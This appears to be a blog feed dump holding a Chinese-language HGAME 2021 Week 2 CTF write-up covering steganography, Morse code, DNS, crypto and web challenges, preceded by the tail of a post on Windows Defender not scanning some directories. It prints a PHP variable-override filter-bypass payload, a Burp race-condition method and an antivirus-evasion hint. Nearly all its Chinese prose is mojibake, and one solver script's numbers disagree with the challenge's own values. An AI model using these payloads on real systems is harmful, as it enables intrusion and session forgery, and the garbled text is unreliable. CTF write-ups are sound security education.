src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2537508016.png"></p><p>å±…ç„¶æˆåŠŸäº†ï¼Ÿå§æ§½ï¼ï¼ï¼ï¼ï¼ï¼<br>ç„¶åæˆ‘åˆè¢«è„šæœ¬ç§»åˆ°å…¶ä»–ä½ç½®ï¼Œç»§ç»­æ€ï¼Œæˆ‘å°±å¾ˆç–‘æƒ‘ã€‚<br>é€šè¿‡å¯¹æ¯”åŸå…ˆçš„æ–‡ä»¶ï¼Œæˆ‘å‘ç°æˆ‘åªæ˜¯åŠ äº†å‡ ä¸ªæ¢è¡Œï¼Œç„¶åæˆ‘æ”¾åˆ°äº†ä¸åŒçš„ç›®å½•ä¸‹ï¼Œæ”¾åœ¨æ¡Œé¢å±…ç„¶ä¸æ€</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3829236803.png"></p><p>æœ€åæˆ‘å¬åˆ°å†·æ„è€å“¥è¯´è¿‡ï¼Œwindows defender å¥½åƒä¼šä¸æ€ä¸€äº›ç›®å½•â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.</p><h1 id="å½©è›‹"><a href="#å½©è›‹" class="headerlink" title="å½©è›‹"></a>å½©è›‹</h1><p>é‚£ä¹ˆå„ä½ï¼Œé‚£äº›ç›®å½•ä¸ä¼šè¢«æ€å˜ï¼Ÿå®é™…ä»¥æµ‹è¯•ç¯å¢ƒä¸ºå‡†ï¼Œæˆ‘è‡ªå·±çš„æ˜¯windows å®¶åº­ç‰ˆï¼Œæ²¡è£…ä»»ä½•æ€æ¯’</p>]]></content>
      
      
      <categories>
          
          <category> Gammaå®éªŒå®¤ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Powerview </tag>
            
            <tag> Windowsdefender </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HGAME 2021 WEEK2</title>
      <link href="2021/02/14/2021HGAMEWEEK2/"/>
      <url>2021/02/14/2021HGAMEWEEK2/</url>
      
        <content type="html"><![CDATA[<h1 id="0X1Misc"><a href="#0X1Misc" class="headerlink" title="0X1Misc"></a>0X1Misc</h1><h2 id="1-Tools"><a href="#1-Tools" class="headerlink" title="1.Tools"></a>1.Tools</h2><blockquote><p>å·¥æ¬²å–„å…¶äº‹ï¼Œå¿…å…ˆåˆ©å…¶å™¨ã€‚</p><p><a href="https://pan.baidu.com/s/14_A8L9q7F0t4_UzWWwowpQ"><strong>é™„ä»¶</strong></a>ï¼ˆæå–ç ï¼šglalï¼‰</p></blockquote><p>å¾ˆæ˜æ˜¾çœ‹é™„ä»¶åå°±çŸ¥é“æ˜¯F5éšå†™<br>é¦–å…ˆæˆ‘ä»¬æŸ¥çœ‹å±æ€§å¾—çŸ¥å…¶å¯†ç ï¼š<code>!LyJJ9bi&amp;M7E72*JyD</code>ï¼Œè¿›è€Œå¾—åˆ°å‹ç¼©åŒ…å¯†ç : <code>e@317S*p1A4bIYIs1M</code></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3776381756.png"></p><p>åˆæ˜¯ä¸€å±‚åŠ å¯†â€¦<br>åŒæ ·çš„å¤„ç†æ–¹æ³•ï¼Œå°±æ˜¯è¿™æ¬¡æ˜¯steghideéšå†™ï¼Œå¾—åˆ°å‹ç¼©åŒ…å¯†ç ï¼š<code>u0!FO4JUhl5!L55%$&amp;</code></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1978650805.png"></p><p>å¥½å®¶ä¼™ï¼ç»å…¸è€å¥—å¨ƒäº†<br>è¿™å›æ˜¯Outguesséšå†™ï¼ŒåŒæ ·çš„æ‰‹æ³•å¾—åˆ°å‹ç¼©åŒ…å¯†ç ï¼š<code>@UjXL93044V5zl2ZKI</code></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4083506960.png"></p><p>ç»ˆäºåˆ°æœ€åä¸€å±‚åŠ å¯†äº†ï¼ŒJPHSéšå†™å¾—åˆ°å‹ç¼©åŒ…å¯†ç ï¼š<code>xSRejK1^Z1Cp9M!z@H</code></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/215998599.png"></p><p>æœ€ç»ˆå°†å››å—æ‹¼æ¥èµ·æ¥ç»„æˆä¸€ä¸ªå®Œæ•´çš„äºŒç»´ç ï¼Œæ‰«ç å¾—åˆ°flagï¼šhgame{Taowa_is_N0T_g00d_but_T001s_is_Useful}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/939044409.png"></p><h2 id="2-Telegraphï¼š1601-6639-3459-3134-0892"><a href="#2-Telegraphï¼š1601-6639-3459-3134-0892" class="headerlink" title="2.Telegraphï¼š1601 6639 3459 3134 0892"></a>2.Telegraphï¼š1601 6639 3459 3134 0892</h2><blockquote><p>ä»–æ›¾ç»æœ€å–œæ¬¢çš„æ›²å¸ˆå†™çš„æ›²å­ï¼Œè®©äººçŠ¹å¦‚æ¼«æ­¥åœ¨æ˜Ÿç©ºä¹‹ä¸‹ï¼Œå¯å¦‚ä»Šä»–å¬è§åªè§‰å¾—åèƒƒã€‚ç”±äºæ–‡ä»¶åè¿‡é•¿ï¼Œå•ç‹¬ç»™å‡ºé™„ä»¶çš„md5: E5C3EE3F441B860B07A3ADCD98BFFC00<br>è¯·å°†flagä»¥hgame{your_flag_here}å½¢å¼æäº¤ï¼Œflagä¸ºå…¨å¤§å†™ã€‚</p><p><a href="https://pan.baidu.com/s/1RiMUwlUa07rtGHT9PxdKDQ"><strong>é™„ä»¶</strong></a>ï¼ˆæå–ç ï¼še397ï¼‰</p></blockquote><p>æ’­æ”¾å¾ˆæ˜æ˜¾æœ‰æ®µæºæ‚ç€æ‘©æ–¯ç”µç </p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3904669029.png"></p><p>æ•´ç†å¾—åˆ°å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-.-- --- ..- .-. ..-. .-.. .- --. .. ... ---... ....- --. ----- ----- -.. ... ----- -. --. -... ..- - -. ----- - ....- --. ----- ----- -.. -- .- -. ----- ...-- ----. ...-- .---- ----- -.- ..</span><br></pre></td></tr></table></figure><p>Morseè§£å¾—flagï¼šhgame{4G00DS0NGBUTN0T4G00DMAN039310KI}</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yourflagis:4g00ds0ngbutn0t4g00dman039310ki</span><br></pre></td></tr></table></figure><h2 id="3-Hallucigenia"><a href="#3-Hallucigenia" class="headerlink" title="3.Hallucigenia"></a>3.Hallucigenia</h2><blockquote><p>â€œæˆ‘ä»¬ä¸ä»…å¼„é”™äº†ä»–çš„ä¸Šä¸‹ï¼Œè¿˜é¢ å€’äº†å®ƒçš„å·¦å³ã€‚â€</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/814317860.png"></p></blockquote><p>lsbå‘ç°äºŒç»´ç </p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4009259933.png"></p><p>æ‰«ç å¾—åˆ°å­—ç¬¦ä¸²ï¼ˆbushi  å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gmBCrkRORUkAAAAA+jrgsWajaq0BeC3IQhCEIQhCKZw1MxTzSlNKnmJpivW9IHVPrTjvkkuI3sP7bWAEdIHWCbDsGsRkZ9IUJC9AhfZFbpqrmZBtI+ZvptWC&#x2F;KCPrL0gFeRPOcI2WyqjndfUWlNj+dgWpe1qSTEcdurXzMRAc5EihsEflmIN8RzuguWq61JWRQpSI51&#x2F;KHHT&#x2F;6&#x2F;ztPZJ33SSKbieTa1C5koONbLcf9aYmsVh7RW6p3SpASnUSb3JuSvpUBKxscbyBjiOpOTq8jcdRsx5&#x2F;IndXw3VgJV6iO1+6jl4gjVpWouViO6ih9ZmybSPkhaqyNUxVXpV5cYU+Xx5sQTfKystDLipmqaMhxIcgvplLqF&#x2F;LWZzIS5PvwbqOvrSlNHVEYchCEIQISICSZJijwu50rRQHDyUpaF0y&#x2F;&#x2F;&#x2F;p6FEDCCDFsuW7YFoVEFEST0BAACLgLOrAAAAAggUAAAAtAAAAFJESEkNAAAAChoKDUdOUIk&#x3D;</span><br></pre></td></tr></table></figure><p>è·‘ä¸‹è„šæœ¬å‘ç°å®ƒå¹¶éå­—ç¬¦ä¸²è€Œåº”è¯¥æ˜¯ä¸ªpngçš„äºŒè¿›åˆ¶æ–‡ä»¶</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3635629162.png"></p><p><strong>é™„ä¸Šè„šæœ¬ï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from base64 import b64decode </span><br><span class="line"></span><br><span class="line">open(&#39;flag&#39;, &#39;wb+&#39;).write(b64decode(open(&#39;flag.txt&#39;, &#39;rb&#39;).read()))</span><br></pre></td></tr></table></figure><p>äºæ˜¯ä¹åˆ©ç”¨è„šæœ¬å°†å…¶åè½¬å¾—åˆ°pngå›¾ç‰‡  </p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/47297967.png"></p><p><strong>é™„ä¸Šè„šæœ¬ï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from base64 import b64decode </span><br><span class="line"></span><br><span class="line">open(&#39;flag.png&#39;, &#39;wb+&#39;).write(b64decode(open(&#39;flag.txt&#39;, &#39;rb&#39;).read()) [::-1])</span><br></pre></td></tr></table></figure><p>å®šç›ä¸€çœ‹åè¿‡æ¥å°±æ˜¯flagï¼šhgame{tenchi_souzou_dezain_bu}</p><h2 id="4-DNS"><a href="#4-DNS" class="headerlink" title="4.DNS"></a>4.DNS</h2><blockquote><p>A significant invention.</p><p><a href="https://pan.baidu.com/s/1v2nj2b1OU37p6vy1e791Zw"><strong>é™„ä»¶</strong></a>ï¼ˆæå–ç ï¼š6af6ï¼‰</p></blockquote><p>åœ¨DNSä¸‹å‘ç°ä¸€ä¸ªåŸŸå <code>flag.hgame2021.cf</code> </p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3826579680.png"></p><p>å¯¹å…¶è¿›è¡Œè®¿é—®ï¼ŒæŸ¥çœ‹æºç å‘ç°å…³é”®ä¿¡æ¯ï¼šSPF</p><blockquote><p>ä½•ä¸ºSPFï¼Ÿï¼ˆç™¾åº¦ä¸€ä¸‹æˆ‘å°±çŸ¥é“<br><a href="https://www.altn.com.cn/5728.html">https://www.altn.com.cn/5728.html</a></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4278093788.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/308378175.png"></p><p>æœ€å<a href="https://uutool.cn/nslookup/">nslookupæŸ¥è¯¢å…¶TXTè®°å½•</a>å¾—åˆ°flagï¼šhgame{D0main_N4me_5ystem}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2004921368.png"></p><p>Windows-cmdæŸ¥è¯¢å‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nslookup</span><br><span class="line">set q&#x3D;txt</span><br><span class="line">flag.hgame2021.cf</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/952190089.png"></p><p>Linux-kaliæŸ¥è¯¢å‘½ä»¤ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ç”±äºæˆ‘ç”¨çš„æ˜¯kali2020ï¼Œæˆ‘éœ€è¦å…ˆåˆ‡æ¢åˆ°rootæƒé™å†æ‰§è¡Œä»¥ä¸‹å‘½ä»¤</span><br><span class="line">dig -t txt flag.hgame2021.cf</span><br></pre></td></tr></table></figure><h1 id="0X2Web"><a href="#0X2Web" class="headerlink" title="0X2Web"></a>0X2Web</h1><h2 id="1-LazyDogR4U"><a href="#1-LazyDogR4U" class="headerlink" title="1.LazyDogR4U"></a>1.LazyDogR4U</h2><blockquote><p>æ‡’ç‹—R4uæŠŠFlagè—èµ·æ¥äº†ï¼Œä½†ç”±äºä»–æ˜¯æ‡’ç‹—ï¼Œæ‰€ä»¥flagè—çš„å¾ˆä¸å®‰å…¨ã€‚<br>Challenge Address<br><a href="http://ecdaa2e20e.lazy.r4u.top/">http://ecdaa2e20e.lazy.r4u.top</a></p></blockquote><p><a href="http://www.zipä¸‹è½½æºç /">www.zipä¸‹è½½æºç </a><br>å®¡è®¡flag.phpï¼šå¼•å…¥äº†lazy.php å¹¶ä¸” å‘ç°æ»¡è¶³ <code>$_SESSION[&#39;username&#39;] === &#39;admin&#39;</code> å³å¯è·å–flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">require_once &#39;lazy.php&#39;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(!isset($_SESSION[&#39;username&#39;]))&#123;</span><br><span class="line">    die(&#39;æ‚¨é…å—ï¼Ÿ&#39;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;ie&#x3D;edge&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;static&#x2F;style.css&quot;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form class&#x3D;&quot;box&quot; action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line"></span><br><span class="line">    if($_SESSION[&#39;username&#39;] &#x3D;&#x3D;&#x3D; &#39;admin&#39;)&#123;</span><br><span class="line">        echo &quot;&lt;h3 style&#x3D;&#39;color: white&#39;&gt;adminå°†äºä»Šæ—¥è·å–è‡ªå·±å¿ å®çš„flag&lt;&#x2F;h3&gt;&quot;;</span><br><span class="line">        echo &quot;&lt;h3 style&#x3D;&#39;color: white&#39;&gt;$flag&lt;&#x2F;h3&gt;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        if($submit &#x3D;&#x3D; &quot;getflag&quot;)&#123;</span><br><span class="line">            echo &quot;&lt;h3 style&#x3D;&#39;color: white&#39;&gt;&#123;$_SESSION[&#39;username&#39;]&#125;æ¥è¿‘äº†é—®é¢˜çš„ç»ˆç‚¹&lt;&#x2F;h3&gt;&quot;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;&lt;h3 style&#x3D;&#39;color: white&#39;&gt;ç¯¡ä½è€…å é¢†äº†ç¥åœ£çš„é¡µé¢&lt;&#x2F;h3&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">        ?&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;getflag&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>æ¥ç€ï¼Œå®¡è®¡lazy.phpï¼šå‘ç°å¯å°† <code>_GET</code> ã€ <code>_POST</code> ä¼ â¼Šçš„å˜é‡å…¨éƒ¨æ³¨å†Œä¸ºæ™®é€šå˜é‡é€ æˆå˜é‡è¦†ç›–</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$filter &#x3D; [&quot;SESSION&quot;, &quot;SEVER&quot;, &quot;COOKIE&quot;, &quot;GLOBALS&quot;];</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; ç›´æ¥æ³¨å†Œæ‰€æœ‰å˜é‡ï¼Œè¿™æ ·æˆ‘å°±èƒ½å°‘æ‰“å­—åŠ›ï¼ŒèŠœæ¹–~</span><br><span class="line"></span><br><span class="line">foreach(array(&#39;_GET&#39;,&#39;_POST&#39;) as $_request)&#123;</span><br><span class="line">    foreach ($$_request as $_k &#x3D;&gt; $_v)&#123;</span><br><span class="line">        foreach ($filter as $youBadBad)&#123;</span><br><span class="line">            $_k &#x3D; str_replace($youBadBad, &#39;&#39;, $_k);</span><br><span class="line">        &#125;</span><br><span class="line">        $&#123;$_k&#125; &#x3D; $_v;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; è‡ªåŠ¨åŠ è½½ç±»ï¼Œè¿™æ ·æˆ‘ä¹Ÿèƒ½å°‘æ‰“å­—åŠ›ï¼ŒèŠœæ¹–~</span><br><span class="line">function auto($class_name)&#123;</span><br><span class="line">    require_once $class_name . &quot;.php&quot;;</span><br><span class="line">&#125;</span><br><span class="line">spl_autoload_register(&#39;auto&#39;);</span><br></pre></td></tr></table></figure><p>äºæ˜¯å°† <code>_SESSION[username]</code> è¿™ä¸ªå…¨å±€å˜é‡è¿›è¡Œæ„é€ </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">flag.php?_SESSESSIONSION[username]&#x3D;admin</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆå¾—åˆ°flagï¼šhgame{r4u~i5_@_l@zY-D0G}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1735185186.png"></p><h2 id="2-Post-to-zuckonit"><a href="#2-Post-to-zuckonit" class="headerlink" title="2.Post to zuckonit"></a>2.Post to zuckonit</h2><blockquote><p>d1gg12 æ–°å­¦äº†HTMLï¼Œä¸€èµ·æ¥çœ‹çœ‹ä»–å†™çš„åœ¨çº¿åšå®¢å§ï¼<br>Challenge Address<br><a href="http://zuckonit.0727.site/">http://zuckonit.0727.site</a>:7654</p></blockquote><p>xss</p><h2 id="3-200OK"><a href="#3-200OK" class="headerlink" title="3.200OK!!"></a>3.200OK!!</h2><blockquote><p>ä»Šå¤©ä½  PTSD äº†å—ï¼Ÿ<br>Challenge Address<br><a href="https://200ok.liki.link/">https://200ok.liki.link</a></p></blockquote><p>sqlæ³¨å…¥</p><h2 id="4-Likiçš„ç”Ÿæ—¥ç¤¼ç‰©"><a href="#4-Likiçš„ç”Ÿæ—¥ç¤¼ç‰©" class="headerlink" title="4.Likiçš„ç”Ÿæ—¥ç¤¼ç‰©"></a>4.Likiçš„ç”Ÿæ—¥ç¤¼ç‰©</h2><blockquote><p>Likiç”Ÿæ—¥å¿«è¦åˆ°äº†ï¼Œå¥¹æƒ³è¦ä¸€å°switchï¼Œä½ èƒ½å¸®å¸®å¥¹ä¹ˆï¼Ÿ<br>Challenge Address<br><a href="https://birthday.liki.link/">https://birthday.liki.link</a></p></blockquote><p>è€ƒæŸ¥ï¼šæ¡ä»¶ç«äº‰ï¼Œåœ¨å…‘æ¢åŠµæ—¶å¯¹å…¶æŠ“åŒ…ç„¶åå¤šçº¿ç¨‹é‡å¤å‘åŒ…</p><p>ç™»å½•è¿›å»å¯ä»¥å‘ç°åªéœ€è´­ä¹°52å¼ å°±å¯ä»¥è·å–flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/451046037.png"></p><p>æ‰“å¼€burpè¿›è¡ŒæŠ“åŒ…</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4207973914.png"></p><p>è¿›è¡Œintruderï¼Œé€‰æ‹©Null payloadså¹¶ç”Ÿæˆ100ä¸ªpayloads</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1504544233.png"></p><p>é€‰æ‹©10è¿›ç¨‹å¹¶å‘æ‰§è¡Œ</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2669061383.png"></p><p>Start Attack</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3767903207.png"></p><p>åˆ·æ–°é¡µé¢ä¹‹åå…‘æ¢å³å¯å¾—åˆ°flagï¼šhgame{L0ck_1s_TH3_S0lllut!on!!!}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3597611091.png"></p><h1 id="0X2Crypto"><a href="#0X2Crypto" class="headerlink" title="0X2Crypto"></a>0X2Crypto</h1><h2 id="1-signin"><a href="#1-signin" class="headerlink" title="1.signin"></a>1.signin</h2><blockquote><p>ç­¾åˆ°é¢˜ 233<br>Challenge Address <a href="https://mod.liki.link/">https://mod.liki.link</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG</span><br><span class="line"></span><br><span class="line">m = s2n(FLAG)</span><br><span class="line">a = number.getPrime(<span class="number">1024</span>)</span><br><span class="line">p = number.getPrime(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">c = a ** p * m % p</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;a = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(a))</span><br><span class="line">print(<span class="string">&quot;p = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(p))</span><br><span class="line">print(<span class="string">&quot;c = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(c))</span><br><span class="line"><span class="comment"># a = 139797327006915116125126834708569781257905890889214772754132967944560239477559427234818170821905966089190947970216980685309703521750454649892247689054657607174600902412798917747263330185879424486123329896583384878012975296270715665441346026354817476240516457708613238092696963533041009088500592879662166253257</span></span><br><span class="line"><span class="comment"># p = 151730388933509920208398125559765127290441122573229308376450817125256445382422908158672019884194306096919838130907844546729851309788163360015419981802510147036452621347724746013834845831207220493241621927858819016342531775639148674368365993683788605987857873546489688725060327903851376240619248166306123462663</span></span><br><span class="line"><span class="comment"># c = 88732386468504387282857878979411728549526363384046769757050721891386416926099771636774309722073926162140997385022007310495636448572530441526048408400076676269906889357399751593581177111658275917266905263737388647978425632263036544709572767498549738915832567940145078140586586992388462314474394590770638444139</span></span><br></pre></td></tr></table></figure><p>m=c â‹… a^(âˆ’1) mod p  =&gt; flagï¼šhgame{M0du1@r_m4th+1s^th3~ba5is-Of=cRypt0!!}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3897441851.png"></p><blockquote><p>è´¹é©¬å°å®šç†ï¼šå¦‚æœpæ˜¯ä¸€ä¸ªè´¨æ•°ï¼Œè€Œæ•´æ•°aä¸æ˜¯pçš„å€æ•°ï¼Œåˆ™æœ‰a^ï¼ˆp-1ï¼‰â‰¡1ï¼ˆmod pï¼‰</p></blockquote><p><strong>é™„ä¸Šè„šæœ¬ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">a = gmpy2.mpz(<span class="number">164082656705280243691125701366387366083595671395343593709662689631005563420712514013315976102671561607316385961761351750099262566476484522886282723886520916918141054995957297228003062477122757133630754605589171370142255727815498152265374544695303477525391985791134432904658602561841437101787689055904235722543</span>)</span><br><span class="line">p = gmpy2.mpz(<span class="number">119737975692964086468800522901334964831462403986044100108042760900964357796378935817727112428450685227062069911631189059668095468384251497619994295762904825142670700856495550090451162130895038569427260669297398177894831568054918372123884561767488134043298231005288709340276215664659982597587377569232740821383</span>) </span><br><span class="line">c = gmpy2.mpz(<span class="number">61634913046503959178216377910203847308428571260648767327608998821120378164975042475439460895394673980137101460250286330274948376187417345460266021486815411513611233649751971142112272707408612929020818762110963149534344745362620646443064201836579453768233731326328543553543287448234680170625258920657056312732</span>)</span><br><span class="line">x = gmpy2.invert(a, p)</span><br><span class="line">m = c * x % p</span><br><span class="line"></span><br><span class="line">print(m) </span><br><span class="line">print(n2s(<span class="built_in">int</span>(m))) </span><br></pre></td></tr></table></figure><h2 id="2-gcd-or-more"><a href="#2-gcd-or-more" class="headerlink" title="2.gcd or more?"></a>2.gcd or more?</h2><blockquote><p>GCDâ€¦?<br>Challenge Address <a href="https://more.liki.link/">https://more.liki.link</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG</span><br><span class="line"></span><br><span class="line">p = <span class="number">85228565021128901853314934583129083441989045225022541298550570449389839609019</span></span><br><span class="line">q = <span class="number">111614714641364911312915294479850549131835378046002423977989457843071188836271</span></span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line">cipher = <span class="built_in">pow</span>(s2n(FLAG), <span class="number">2</span>, n)</span><br><span class="line">print(cipher)</span><br><span class="line"><span class="comment"># 7665003682830666456193894491015989641647854826647177873141984107202099081475984827806007287830472899616818080907276606744467453445908923054975393623509539</span></span><br></pre></td></tr></table></figure><p><a href="https://xz.aliyun.com/t/5113">Rabin</a>ï¼Œè·‘ä¸‹è„šæœ¬å¾—åˆ°flagï¼šhgame{3xgCd~i5_re4l1y+e@sy^r1ght?}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/807844213.png"></p><p><strong>é™„ä¸Šè„šæœ¬</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span 